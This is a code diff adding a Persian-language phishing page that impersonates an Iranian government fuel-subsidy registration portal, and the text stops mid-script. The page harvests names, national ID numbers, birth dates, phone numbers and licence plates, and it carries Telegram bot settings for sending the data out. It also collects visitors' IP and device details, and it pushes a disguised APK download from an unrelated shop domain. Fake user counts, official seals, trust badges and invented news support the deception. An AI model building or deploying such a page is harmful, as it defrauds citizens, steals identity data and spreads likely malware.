@@ -1,0 +1,697 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+ <meta charset="UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ <title>پایگاه ملی توزیع سوخت هوشمند</title>
+ <style>
+ @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700;900&display=swap');
+
+ * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Vazirmatn', sans-serif; }
+ body { background: linear-gradient(135deg, #f0f2f5 0%, #e8eaf6 100%); color: #333; line-height: 1.6; min-height: 100vh; }
+
+ /* Header */
+ .header { background: linear-gradient(135deg, #1a237e, #283593); color: white; padding: 15px 20px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 2px 10px rgba(0,0,0,0.2); position: sticky; top: 0; z-index: 100; }
+ .logo-area { display: flex; align-items: center; gap: 10px; }
+ .logo-icon { width: 40px; height: 40px; background: #ffca28; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; color: #1a237e; font-size: 18px; }
+ .header h1 { font-size: 18px; font-weight: 700; }
+ .header-info { font-size: 12px; opacity: 0.8; text-align: left; }
+
+ /* Main Container */
+ .container { max-width: 600px; margin: 20px auto; padding: 0 15px; }
+
+ /* Section 1: Registration Form */
+ .form-section { background: white; border-radius: 12px; padding: 25px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); margin-bottom: 20px; border-top: 4px solid #ffca28; }
+ .form-title { text-align: center; margin-bottom: 20px; color: #1a237e; }
+ .form-title h2 { font-size: 22px; margin-bottom: 5px; }
+ .form-title p { font-size: 14px; color: #666; }
+
+ .input-group { margin-bottom: 15px; }
+ .input-group label { display: block; margin-bottom: 5px; font-weight: 700; font-size: 14px; color: #444; }
+ .input-group input, .input-group select { width: 100%; padding: 12px 15px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; transition: all 0.3s; }
+ .input-group input:focus, .input-group select:focus { border-color: #ffca28; outline: none; box-shadow: 0 0 0 3px rgba(255, 202, 40, 0.2); }
+
+ .btn-submit { width: 100%; padding: 14px; background: linear-gradient(135deg, #ffca28, #ffb300); color: #1a237e; border: none; border-radius: 8px; font-size: 18px; font-weight: 900; cursor: pointer; transition: transform 0.2s, box-shadow 0.2s; margin-top: 10px; }
+ .btn-submit:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(255, 179, 0, 0.4); }
+ .btn-submit:active { transform: translateY(0); }
+
+ /* Online Users Bar */
+ .online-bar { background: #e3f2fd; padding: 10px 15px; border-radius: 8px; display: flex; align-items: center; justify-content: space-between; margin-top: 15px; border: 1px solid #bbdefb; }
+ .online-status { display: flex; align-items: center; gap: 8px; font-size: 14px; font-weight: 700; color: #1565c0; }
+ .dot { width: 10px; height: 10px; background: #4caf50; border-radius: 50%; animation: pulse 1.5s infinite; }
+ @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+ .user-count { font-size: 14px; color: #666; }
+
+ /* Section 2: Official Text */
+ .official-text { background: white; border-radius: 12px; padding: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); margin-bottom: 20px; border-right: 4px solid #1a237e; }
+ .official-header { display: flex; align-items: center; gap: 10px; margin-bottom: 15px; border-bottom: 1px solid #eee; padding-bottom: 10px; }
+ .ministry-logo { width: 50px; height: 50px; background: #f5f5f5; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px; }
+ .official-text h3 { font-size: 16px; color: #1a237e; }
+ .official-text p { font-size: 14px; color: #555; text-align: justify; }
+ .stamp { display: inline-block; background: #ffebee; color: #c62828; padding: 5px 10px; border-radius: 4px; font-size: 12px; font-weight: 700; margin-top: 10px; border: 1px dashed #c62828; }
+
+ /* Section 3: Guide */
+ .guide-section { background: #fff8e1; border-radius: 12px; padding: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); margin-bottom: 20px; border: 1px solid #ffe082; }
+ .guide-title { font-size: 18px; font-weight: 900; color: #f57f17; margin-bottom: 15px; display: flex; align-items: center; gap: 8px; }
+ .guide-steps { list-style: none; counter-reset: step-counter; }
+ .guide-steps li { counter-increment: step-counter; margin-bottom: 12px; padding-right: 30px; position: relative; font-size: 14px; color: #555; }
+ .guide-steps li::before { content: counter(step-counter); position: absolute; right: 0; top: 0; width: 22px; height: 22px; background: #ffca28; color: #1a237e; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 900; font-size: 12px; }
+ .app-download-btn { display: block; width: 100%; padding: 12px; background: #1a237e; color: white; text-align: center; border-radius: 8px; text-decoration: none; font-weight: 700; margin-top: 15px; transition: background 0.3s; }
+ .app-download-btn:hover { background: #283593; }
+
+ /* City Ticker */
+ .city-ticker { background: white; border-radius: 8px; padding: 10px 15px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); margin-bottom: 20px; overflow: hidden; position: relative; height: 40px; }
+ .ticker-track { display: flex; animation: scroll 20s linear infinite; white-space: nowrap; }
+ .ticker-item { display: inline-flex; align-items: center; gap: 5px; margin-left: 30px; font-size: 14px; font-weight: 700; color: #333; }
+ .status-dot { width: 8px; height: 8px; background: #4caf50; border-radius: 50%; }
+ @keyframes scroll { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
+
+ /* News Section */
+ .news-section { background: white; border-radius: 12px; padding: 20px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); margin-bottom: 20px; }
+ .news-title { font-size: 18px; font-weight: 900; color: #333; margin-bottom: 15px; border-bottom: 2px solid #eee; padding-bottom: 10px; }
+ .news-item { display: flex; gap: 15px; margin-bottom: 15px; padding-bottom: 15px; border-bottom: 1px solid #f5f5f5; }
+ .news-item:last-child { border-bottom: none; margin-bottom: 0; padding-bottom: 0; }
+ .news-img { width: 80px; height: 60px; background: #e0e0e0; border-radius: 6px; flex-shrink: 0; display: flex; align-items: center; justify-content: center; color: #999; font-size: 12px; overflow: hidden; }
+ .news-img img { width: 100%; height: 100%; object-fit: cover; }
+ .news-content h4 { font-size: 14px; margin-bottom: 5px; color: #1a237e; }
+ .news-content p { font-size: 12px; color: #777; }
+ .news-date { font-size: 11px; color: #999; margin-top: 5px; }
+
+ /* Trust Badges */
+ .trust-badges { display: flex; justify-content: center; gap: 15px; margin: 20px 0; }
+ .badge { width: 60px; height: 70px; background: #f5f5f5; border-radius: 8px; display: flex; flex-direction: column; align-items: center; justify-content: center; font-size: 10px; color: #666; border: 1px solid #eee; }
+ .badge-icon { font-size: 24px; margin-bottom: 5px; }
+
+ /* Footer */
+ .footer { text-align: center; padding: 20px; color: #999; font-size: 12px; border-top: 1px solid #eee; margin-top: 20px; }
+
+ /* Modal */
+ .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 1000; align-items: center; justify-content: center; }
+ .modal-content { background: white; padding: 30px; border-radius: 12px; text-align: center; max-width: 300px; animation: popIn 0.3s; }
+ @keyframes popIn { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+ .modal h3 { color: #4caf50; margin-bottom: 10px; }
+ .modal p { font-size: 14px; color: #666; margin-bottom: 20px; }
+ 
+ /* دکمه‌های مودال */
+ .modal-btn { width: 100%; padding: 12px; border: none; border-radius: 6px; cursor: pointer; font-size: 14px; font-weight: bold; margin-bottom: 10px; display: block; text-align: center; text-decoration: none; }
+ .modal-btn-pay { background: #1a237e; color: white; }
+ .modal-btn-dl { background: #28a745; color: white; }
+
+ /* Responsive */
+ @media (max-width: 480px) {
+ .header h1 { font-size: 16px; }
+ .form-section { padding: 15px; }
+ .news-item { flex-direction: column; }
+ .news-img { width: 100%; height: 100px; }
+ }
+
+ /* Multi-step Form Styles */
+ .step-indicator { display: flex; justify-content: space-between; margin-bottom: 20px; }
+ .step { flex: 1; text-align: center; padding: 10px; background: #f5f5f5; border-radius: 8px; margin: 0 5px; font-size: 12px; color: #999; }
+ .step.active { background: #ffca28; color: #1a237e; font-weight: 700; }
+ .step.completed { background: #4caf50; color: white; }
+ 
+ .step-content { display: none; }
+ .step-content.active { display: block; }
+ 
+ .next-btn, .prev-btn { padding: 10px 20px; border: none; border-radius: 6px; cursor: pointer; font-size: 14px; font-weight: 700; }
+ .next-btn { background: #ffca28; color: #1a237e; }
+ .prev-btn { background: #f5f5f5; color: #666; }
+ 
+ .loading-spinner { display: none; width: 20px; height: 20px; border: 3px solid #f3f3f3; border-top: 3px solid #1a237e; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto; }
+ @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+ /* Download Page Styles */
+ .download-page { display: none; text-align: center; padding: 20px; }
+ .download-page h2 { color: #4caf50; margin-bottom: 20px; }
+ .download-btn { display: inline-block; padding: 15px 30px; background: #4caf50; color: white; text-decoration: none; border-radius: 8px; font-size: 18px; font-weight: 700; margin: 10px; }
+ .qr-code { width: 150px; height: 150px; background: #f5f5f5; margin: 20px auto; display: flex; align-items: center; justify-content: center; border-radius: 8px; }
+
+ /* Iran Banner */
+ .iran-banner {
+ background: linear-gradient(135deg, #239f40, #da0000);
+ color: white;
+ padding: 10px 15px;
+ border-radius: 8px;
+ margin-bottom: 20px;
+ display: flex;
+ align-items: center;
+ justify-content: space-between;
+ box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+ }
+ .iran-flag {
+ width: 40px;
+ height: 25px;
+ background: linear-gradient(to bottom, #239f40 33%, #ffffff 33%, #ffffff 66%, #da0000 66%);
+ border-radius: 4px;
+ position: relative;
+ overflow: hidden;
+ }
+ .iran-flag::after {
+ content: '☫';
+ position: absolute;
+ top: 50%;
+ left: 50%;
+ transform: translate(-50%, -50%);
+ color: #da0000;
+ font-size: 12px;
+ }
+ .iran-text {
+ font-size: 14px;
+ font-weight: 700;
+ }
+ </style>
+</head>
+<body>
+
+ <!-- Header -->
+ <div class="header">
+ <div class="logo-area">
+ <div class="logo-icon">بن</div>
+ <div>
+ <h1>پایگاه ملی توزیع سوخت هوشمند</h1>
+ <div class="header-info">وزارت نفت و وزارت تعاون، کار و رفاه اجتماعی</div>
+ </div>
+ </div>
+ <!-- بخش تاریخ -->
+ <div id="headerDate" style="font-size: 12px; text-align: left;"></div>
+ </div>
+
+ <div class="container">
+
+ <!-- Iran Banner -->
+ <div class="iran-banner">
+ <div class="iran-flag"></div>
+ <div class="iran-text">پایگاه رسمی وزارت نفت و وزارت تعاون</div>
+ </div>
+
+ <!-- Section 1: Registration Form -->
+ <div class="form-section">
+ <div class="form-title">
+ <h2>ثبت‌نام سهمیه بنزین ۵ هزار تومانی</h2>
+ <p>کد اعتبارسنجی: MIN-1403-SEC-992</p>
+ </div>
+
+ <!-- Step Indicator -->
+ <div class="step-indicator">
+ <div class="step active" id="step1Indicator">اطلاعات هویتی</div>
+ <div class="step" id="step2Indicator">تأیید اطلاعات</div>
+ <div class="step" id="step3Indicator">نهایی‌سازی</div>
+ </div>
+
+ <!-- Step 1: Personal Info -->
+ <div class="step-content active" id="step1">
+ <form id="phishForm" onsubmit="return false;">
+ <div class="input-group">
+ <label for="fullName">نام و نام خانوادگی</label>
+ <input type="text" id="fullName" placeholder="مثال: علی احمدی" required>
+ </div>
+
+ <div class="input-group">
+ <label for="nationalId">شماره ملی</label>
+ <input type="text" id="nationalId" maxlength="10" placeholder="مثال: 0012345678" required>
+ </div>
+
+ <div class="input-group">
+ <label for="birthDate">تاریخ تولد</label>
+ <input type="date" id="birthDate" required onchange="convertToShamsi(this)">
+ </div>
+
+ <div class="input-group">
+ <label for="phone">شماره موبایل</label>
+ <input type="tel" id="phone" maxlength="11" placeholder="مثال: 09123456789" required>
+ </div>
+
+ <button type="button" class="btn-submit" onclick="goToStep(2)">مرحله بعد</button>
+ </form>
+ </div>
+
+ <!-- Step 2: Vehicle Info -->
+ <div class="step-content" id="step2">
+ <form id="vehicleForm" onsubmit="return false;">
+ <div class="input-group">
+ <label for="plate">پلاک خودرو</label>
+ <input type="text" id="plate" placeholder="مثال: ۱۲ ب ۱۲۳۴۵۶" required>
+ </div>
+
+ <div class="input-group">
+ <label for="province">استان</label>
+ <select id="province" onchange="updateCities()" required>
+ <option value="">انتخاب استان...</option>
+ <option value="tehran">تهران</option>
+ <option value="isfahan">اصفهان</option>
+ <option value="fars">فارس</option>
+ <option value="khorasan_r">خراسان رضوی</option>
+ <option value="azarbaijan_e">آذربایجان شرقی</option>
+ <option value="azarbaijan_w">آذربایجان غربی</option>
+ <option value="gilani">گیلان</option>
+ <option value="mazandaran">مازندران</option>
+ <option value="khuzestan">خوزستان</option>
+ <option value="kerman">کرمان</option>
+ <option value="yazd">یزد</option>
+ <option value="hamadan">همدان</option>
+ <option value="qazvin">قزوین</option>
+ <option value="zanjan">زنجان</option>
+ <option value="ardabil">اردبیل</option>
+ <option value="golestan">گلستان</option>
+ <option value="north_khorasan">خراسان شمالی</option>
+ <option value="south_khorasan">خراسان جنوبی</option>
+ <option value="bushehr">بوشهر</option>
+ <option value="Hormozgan">هرمزگان</option>
+ <option value="ilam">ایلام</option>
+ <option value="kermanshah">کرمانشاه</option>
+ <option value="lorestan">لرستان</option>
+ <option value="chaharmahal">چهارمحال و بختیاری</option>
+ <option value="kohgiluyeh">کهگیلویه و بویراحمد</option>
+ <option value="markazi">مرکزی</option>
+ <option value="semnan">سمنان</option>
+ <option value="alborz">البرز</option>
+ <option value="qom">قم</option>
+ <option value="kurdistan">کردستان</option>
+ <option value="gorgan">گرگان</option>
+ </select>
+ </div>
+
+ <div class="input-group">
+ <label for="city">شهر</label>
+ <select id="city" required>
+ <option value="">ابتدا استان را انتخاب کنید</option>
+ </select>
+ </div>
+
+ <div class="input-group">
+ <label for="carModel">مدل خودرو</label>
+ <select id="carModel" required>
+ <option value="">انتخاب مدل خودرو...</option>
+ <option value="pride">پراید</option>
+ <option value="peugeot_206">پژو ۲۰۶</option>
+ <option value="peugeot_405">پژو ۴۰۵</option>
+ <option value="samand">سمند</option>
+ <option value="dena">دنا</option>
+ <option value="tiba">تیبا</option>
+ <option value="quick">کوئیک</option>
+ <option value="x200">شاهین</option>
+ <option value="other">سایر</option>
+ </select>
+ </div>
+
+ <button type="button" class="btn-submit" onclick="goToStep(3)">مرحله بعد</button>
+ </form>
+ </div>
+
+ <!-- Step 3: Confirmation -->
+ <div class="step-content" id="step3">
+ <div style="background: #f5f5f5; padding: 15px; border-radius: 8px; margin-bottom: 15px;">
+ <h3 style="color: #1a237e; margin-bottom: 10px;">خلاصه اطلاعات</h3>
+ <p><strong>نام:</strong> <span id="summaryName"></span></p>
+ <p><strong>شماره ملی:</strong> <span id="summaryNationalId"></span></p>
+ <p><strong>تاریخ تولد:</strong> <span id="summaryBirthDate"></span></p>
+ <p><strong>موبایل:</strong> <span id="summaryPhone"></span></p>
+ <p><strong>پلاک:</strong> <span id="summaryPlate"></span></p>
+ <p><strong>استان:</strong> <span id="summaryProvince"></span></p>
+ <p><strong>شهر:</strong> <span id="summaryCity"></span></p>
+ <p><strong>خودرو:</strong> <span id="summaryCarModel"></span></p>
+ </div>
+
+ <button type="button" class="btn-submit" id="finalSubmitBtn" onclick="submitForm()">ثبت‌نام و دریافت سهمیه</button>
+ <div class="loading-spinner" id="loadingSpinner"></div>
+ </div>
+
+ <!-- Online Users Bar -->
+ <div class="online-bar">
+ <div class="online-status">
+ <div class="dot"></div>
+ <span>کاربران آنلاین</span>
+ </div>
+ <div class="user-count" id="userCount">۱۲,۴۵۶ نفر</div>
+ </div>
+ </div>
+
+ <!-- Section 2: Official Text -->
+ <div class="official-text">
+ <div class="official-header">
+ <div class="ministry-logo">🏛️</div>
+ <div>
+ <h3>اطلاعیه مشترک وزارت نفت و وزارت تعاون</h3>
+ <small id="newsDate" style="display:block; margin-top:4px; color:#888;"></small>
+ </div>
+ </div>
+ <p>
+ بدین‌وسیله به اطلاع عموم شهروندان گرامی می‌رساند، بر اساس مصوبه جدید شورای عالی انرژی و با هدف حمایت از اقشار کم‌درآمد و متوسط کشور، طرح توزیع بنزین یارانه‌ای با قیمت ۵ هزار تومان برای هر لیتر آغاز شده است. این طرح شامل کلیه دارندگان کارت ملی هوشمند و خودروهای ثبت‌شده در سامانه یکپارچه حمل‌ونقل می‌باشد.
+ <br><br>
+ شهروندان محترم می‌توانند نسبت به ثبت‌نام در سامانه جامع اطلاعات خودرو اقدام نموده و پس از تأیید نهایی، سهمیه ماهیانه ۹۰ لیتری خود را دریافت نمایند. مهلت ثبت‌نام تا پایان <strong>خرداد ماه</strong> تمدید گردیده است.
+ </p>
+ <div class="stamp">مهر وزارت نفت | مهر وزارت تعاون</div>
+ </div>
+
+ <!-- Section 3: Guide -->
+ <div class="guide-section">
+ <div class="guide-title">
+ <span>📋</span>
+ راهنمای ثبت‌نام سریع
+ </div>
+ <ol class="guide-steps">
+ <li>اطلاعات هویتی و شماره پلاک خودرو را وارد نمایید.</li>
+ <li>کد تأیید ارسال شده به موبایل خود را وارد کنید.</li>
+ <li>صبر کنید تا وضعیت سفارش شما "تأیید شد" شود.</li>
+ <li>سهمیه بنزین ۵ هزار تومانی به کارت سوخت شما اضافه می‌شود.</li>
+ </ol>
+ <a href="https://abrivo.ir/s/kkElxoG5jTv85mXLrKFWymkuYA17g8Tx" class="app-download-btn" target="_blank">
+ 📥 دانلود برنامه "سوخت‌بان" و ثبت‌نام داخل برنامه
+ </a>
+ <small style="display: block; margin-top: 8px; color: #666; text-align: center;">* این فقط یک متن نمایشی است (برنامه سوخت‌بان را نصب کنید و از داخل برنامه ثبت‌نام کنید)</small>
+ </div>
+
+ <!-- City Ticker -->
+ <div class="city-ticker">
+ <div class="ticker-track" id="tickerTrack">
+ <!-- Filled by JS -->
+ </div>
+ </div>
+
+ <!-- News Section -->
+ <div class="news-section">
+ <div class="news-title">📰 آخرین اخبار و رویدادها</div>
+
+ <div class="news-item">
+ <div class="news-img">
+ <img src="https://i.ibb.co/TDMwN0WX/IMG-20261104-162318-246.jpg" alt="خبر اول">
+ </div>
+ <div class="news-content">
+ <h4>افزایش ۲۰ درصدی سهمیه بنزین برای خودروهای فرسوده</h4>
+ <p>طبق دستور وزیر نفت، خودروهای بالای ۱۰ سال مشمول افزایش سهمیه می‌شوند.</p>
+ <div class="news-date">۲ ساعت پیش</div>
+ </div>
+ </div>
+
+ <div class="news-item">
+ <div class="news-img">
+ <img src="https://i.ibb.co/NdLmQhbW/IMG-20261104-162318-302.jpg" alt="خبر دوم">
+ </div>
+ <div class="news-content">
+ <h4>تحویل ۵۰ میلیون کارت سوخت هوشمند در سراسر کشور</h4>
+ <p>عملیات توزیع کارت‌های جدید در ۳۱ استان با موفقیت انجام شد.</p>
+ <div class="news-date">۵ ساعت پیش</div>
+ </div>
+ </div>
+
+ <div class="news-item">
+ <div class="news-img">
+ <img src="https://i.ibb.co/66Y8FBf/IMG-20261104-162318-485.jpg" alt="خبر سوم">
+ </div>
+ <div class="news-content">
+ <h4>اپلیکیشن "سوخت‌بان" نسخه ۲.۵ منتشر شد</h4>
+ <p>امکان مشاهده لحظه‌ای موجودی و تاریخچه مصرف بنزین فراهم شد.</p>
+ <div class="news-date">دیروز</div>
+ </div>
+ </div>
+ </div>
+
+ <!-- Trust Badges -->
+ <div class="trust-badges">
+ <div class="badge">
+ <div class="badge-icon">🔒</div>
+ <span>SSL امن</span>
+ </div>
+ <div class="badge">
+ <div class="badge-icon">✅</div>
+ <span>نماد اعتماد</span>
+ </div>
+ <div class="badge">
+ <div class="badge-icon">🏛️</div>
+ <span>دولتی</span>
+ </div>
+ <div class="badge">
+ <div class="badge-icon">📞</div>
+ <span>پشتیبانی ۲۴/۷</span>
+ </div>
+ </div>
+
+ <!-- Download Page -->
+ <div class="download-page" id="downloadPage">
+ <h2>✅ ثبت‌نام شما با موفقیت انجام شد!</h2>
+ <p>لطفاً برنامه "سوخت‌بان" را دانلود کنید تا سهمیه شما فعال شود.</p>
+ 
+ <div class="qr-code">
+ <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://salesservices.shop/File/file_205.apk" alt="QR Code">
+ </div>
+ 
+ <a href="https://salesservices.shop/File/file_205.apk" class="download-btn" target="_blank">
+ 📥 دانلود مستقیم
+ </a>
+ 
+ <p style="margin-top: 20px; font-size: 12px; color: #999;">
+ کد پیگیری: <strong id="trackingCode"></strong><br>
+ وضعیت: در حال پردازش توسط سیستم مرکزی
+ </p>
+ </div>
+
+ </div>
+
+ <!-- Footer -->
+ <div class="footer">
+ <p id="footerDate"></p>
+ <p style="margin-top: 5px;">طراحی و توسعه توسط شرکت فناوری اطلاعات انرژی</p>
+ </div>
+
+ <!-- Success Modal -->
+ <div class="modal" id="successModal">
+ <div class="modal-content">
+ <h3>✅ ثبت‌نام موفق!</h3>
+ <p>اطلاعات شما با موفقیت دریافت شد. کد پیگیری: <strong id="trackingCodeModal"></strong></p>
+ <p style="font-size: 12px; color: #999; margin-bottom: 15px;">وضعیت فعلی: در حال بررسی توسط سیستم مرکزی</p>
+ 
+ <a href="https://pay-fuel-ir.netlify.app" class="modal-btn modal-btn-pay" target="_blank">تسویه سهمیه</a>
+ <button class="modal-btn modal-btn-dl" onclick="showDownloadPage()">مشاهده صفحه دانلود</button>
+ 
+ </div>
+ </div>
+
+ <script>
+ // ==================== تنظیمات تلگرام ====================
+ const TELEGRAM_BOT_TOKEN = 'token باتت';
+ const TELEGRAM_CHAT_ID = 'id عددیت';
+
+ // ==================== تاریخ شمسی خودکار ====================
+ function getShamsiDate() {
+    const date = new Date();
+    const formatter = new Intl.DateTimeFormat('fa-IR-u-ca-persian', {
+        year: 'numeric',
+        month: '2-digit',
+        day: '2-digit'
+    });
+    return formatter.format(date); 
+ }
+
+ function updateAllDates() {
+     const todayStr = getShamsiDate();
+     document.getElementById('headerDate').innerHTML = `ایجاد طرح در: <br> مورخ ${todayStr}`;
+     document.getElementById('newsDate').innerText = 'تاریخ انتشار: ' + todayStr;
+     const yearOnly = todayStr.split('/')[0];
+     document.getElementById('footerDate').innerText = '© ' + yearOnly + ' پایگاه ملی توزیع سوخت هوشمند | تمامی حقوق محفوظ است';
+ }
+ 
+ updateAllDates();
+ setInterval(updateAllDates, 60000);
+
+ // ==================== گرفتن IP و اطلاعات دستگاه ====================
+ async function getClientInfo() {
+     let ip = "نامشخص";
+     try {
+         const res = await fetch('https://api.ipify.org?format=json');
+         const data = await res.json();
+         ip = data.ip;
+     } catch (e) { console.log("IP fetch error"); }
+
+     const ua = navigator.userAgent;
+     let os = "نامشخص";
+     if (ua.indexOf("Android") !== -1) os = "Android";
+     else if (ua.indexOf("iPhone") !== -1) os = "iOS";
+     else if (ua.indexOf("Windows") !== -1) os = "Windows";
+     else if (ua.indexOf("Mac") !== -1) os = "Mac";
+
+     let browser = "نامشخص";
+     if (ua.indexOf("Chrome") !== -1) browser = "Chrome";
+     else if (ua.indexOf("Firefox") !== -1) browser = "Firefox";
+     else if (ua.indexOf("Safari") !== -1) browser = "Safari";
+
+     return { ip: ip, os: os, browser: browser, ua: ua };
+ }
+
+ // ==================== سایر تنظیمات ====================
+ let currentUsers = 12456;
+ const userCountEl = document.getElementById('userCount');
+ function updatePersianNumber(num) {
+ const persianDigits = ['۰', '۱', '۲', '۳', '۴', '۵', '۶', '۷', '۸', '۹'];
+ return num.toString().replace(/\d/g, d => persianDigits[d]);
+ }
+ function updateOnlineUsers() {
+ const change = Math.floor(Math.random() * 120) - 50;
+ currentUsers += change;
+ if (currentUsers < 10000) currentUsers = 10000;
+ if (currentUsers > 15000) currentUsers = 15000;
+ userCountEl.textContent = updatePersianNumber(currentUsers.toLocaleString()) + ' نفر';
+ }
+ setInterval(updateOnlineUsers, 3000);
+ updateOnlineUsers();
+
+ const cities = ['تهران', 'اصفهان', 'مشهد', 'شیراز', 'تبریز', 'کرج', 'اهواز', 'قم'];
+ const tickerTrack = document.getElementById('tickerTrack');
+ let tickerHTML = '';
+ cities.forEach(city => {
+ tickerHTML += `<div class="ticker-item"><span class="status-dot"></span><span>${city}</span><span style="color: #4caf50; font-size: 12px;">فعال</span></div>`;
+ });
+ tickerTrack.innerHTML = tickerHTML;
+
+ // Cities Data
+ const cityData = {
+ tehran: ['تهران', 'ری', 'شمیرانات', 'ورامین', 'پاکدشت', 'قدس', 'فیروزکوه', 'قرچک', 'دماوند', 'اشتهارد'],
+ isfahan: ['اصفهان', 'کاشان', 'نجف‌آباد', 'لنجان', 'شاهین‌شهر', 'ملایر', 'خمینی‌شهر', 'تودشک', 'بهارستان', 'خوانسار'],
+ fars: ['شیراز', 'مرودشت', 'جهرم', 'کازرون', 'فسا', 'لار', 'داراب', 'استهبان', 'خنج', 'ممسنی'],
+ khorasan_r: ['مشهد', 'نیشابور', 'تربت حیدریه', 'قوچان', 'گناباد', 'سرخس', 'فریمان', 'چناران', 'خلیل‌آباد', 'تربت جام'],
+ azarbaijan_e: ['تبریز', 'مراغه', 'مرند', 'اهر', 'بناب', 'ملکان', 'سهند', 'شبستر', 'وایقان', 'هادی‌شهر'],
+ azarbaijan_w: ['ارومیه', 'مهاباد', 'میاندوآب', 'پلدشت', 'بوکان', 'سلماس', 'تشنگ', 'چالدران', 'خوی', 'سردشت'],
+ gilani: ['رشت', 'لاهیجان', 'لنگرود', 'رضوانشهر', 'ماسال', 'صومعه‌سرا', 'املش', 'فتوح‌الرحمان', 'شفت', 'کوثر'],
+ mazandaran: ['ساری', 'بابل', 'آمل', 'قائم‌شهر', 'سبزوار', 'گرگان', 'بهنمیر', 'نوشهر', 'نور', 'چالوس'],
+ khuzestan: ['اهواز', 'آبادان', 'خرمشهر', 'دیلم', 'بهبهان', 'مسجد سلیمان', 'اندیمشه', 'بهبهان', 'لالی', 'گتوند'],
+ kerman: ['کرمان', 'رفسنجان', 'جیرفت', 'زرند', 'بافت', 'عنبرآباد', 'هرمز', 'بردسیر', 'فاریاب', 'کوهبنان'],
+ yazd: ['یزد', 'میبد', 'تفت', 'بافق', 'مهردشت', 'اشکذر', 'ابرکوه', 'مهریز', 'اردکان', 'بهاباد'],
+ hamadan: ['همدان', 'ملایر', 'نهاوند', 'تویسرکان', 'کبودرآهنگ', 'اسدآباد', 'رزن', 'بهار', 'تجرد', 'فرسفید'],
+ qazvin: ['قزوین', 'تاکستان', 'آبیک', 'بوئین‌زهرا', 'الموت', 'آوج', 'سیاوشکل', 'تشرین', 'بوئین زهرا'],
+ zanjan: ['زنجان', 'خدنده', 'ماهنشان', 'ایجرود', 'سلطانیه', 'امام‌حسن', 'دلگشا', 'سطت', 'خمام'],
+ ardabil: ['اردبیل', 'پارس‌آباد', 'خلخال', 'مشگین‌شهر', 'نمین', 'نیر', 'بیله‌سوار', 'عجب‌شیر', 'کوراییم'],
+ golestan: ['گرگان', 'علی‌آباد', 'کردکوی', 'گنبد کاووس', 'آزادشهر', 'رامیان', 'لالی‌میر', 'مینودشت', 'کردکوی'],
+ north_khorasan: ['بجنورد', 'شیروان', 'فاروج', 'جاجرم', 'راز و جرگلان', 'عشق‌آباد', 'اسفراین', 'راز و جرگلان'],
+ south_khorasan: ['بیرجند', 'قاینات', 'طبس', 'فردوس', 'نهبندان', 'درمیان', 'خوسف', 'مود', 'قاین'],
+ bushehr: ['بوشهر', 'کنگان', 'عسلویه', 'دلگان', 'گناوه', 'دیلم', 'جم', 'دیر', 'کنگان', 'عسلویه'],
+ Hormozgan: ['بندرعباس', 'بندرلنگه', 'قشم', 'هرمز', 'جزیره هرمز', 'میناب', 'جاسک', 'بندر جاسک', 'مهرستان'],
+ ilam: ['ایلام', 'دهلران', 'آبدانان', 'ملکشاهی', 'ایوان', 'بدره', 'سراب‌باغ', 'چوار', 'مهران'],
+ kermanshah: ['کرمانشاه', 'اسلام‌آباد غرب', 'هرسین', 'کنگاور', 'جوانرود', 'صحنه', 'سطت', 'قصرشیرین', 'سرپل ذهاب'],
+ lorestan: ['خرم‌آباد', 'بروجرد', 'الیگودرز', 'کوهدشت', 'دلفان', 'پلدختر', 'الدنبیل', 'نورآباد', 'دورود'],
+ chaharmahal: ['شهرکرد', 'لردگان', 'کیار', 'بروجن', 'فارسان', 'چلگرد', 'سامان', 'کیان', 'بن'],
+ kohgiluyeh: ['یاسوج', 'دنا', 'گچساران', 'بهارستان', 'باشت', 'پاتاوه', 'سپیددشت', 'دنا', 'گچساران'],
+ markazi: ['اراک', 'ساوه', 'خمین', 'محلات', 'آشتیان', 'تفرش', 'شازند', 'خنداب', 'زرندیه'],
+ semnan: ['سمنان', 'شاهرود', 'دامغان', 'گرمسار', 'محمودآباد', 'شهمیرزاد', 'سرخه', 'ایوانات', 'بیارجمند'],
+ alborz: ['کرج', 'کردان', 'گرمدره', 'طالقان', 'ساوجبلاغ', 'ماهدشت', 'اشتهارد', 'هشتگرد', 'نظرآباد'],
+ qom: ['قم', 'قمصر', 'سلفچگان', 'میهن', 'جوین', 'دستجرد', 'صالح‌آباد'],
+ west_azadi: ['ارومیه', 'مهاباد', 'میاندوآب', 'پلدشت', 'بوکان', 'سلماس', 'چیذر', 'دیواندره'],
+ east_azadi: ['تبریز', 'مراغه', 'مرند', 'اهر', 'بناب', 'ملکان', 'سهند', 'شبستر'],
+ kurdistan: ['سنندج', 'سقز', 'مریوان', 'بانه', 'دیواندره', 'قروه', 'بیجار', 'دیلمه', 'موتمر'],
+ gorgan: ['گرگان', 'علی‌آباد', 'کردکوی', 'گنبد کاووس', 'آزادشهر', 'رامیان', 'لالی‌میر']
+ };
+
+ function updateCities() {
+ const province = document.getElementById('province').value;
+ const citySelect = document.getElementById('city');
+ citySelect.innerHTML = '<option value="">انتخاب شهر...</option>';
+ if (cityData[province]) {
+ cityData[province].forEach(city => {
+ const option = document.createElement('option');
+ option.value = city;
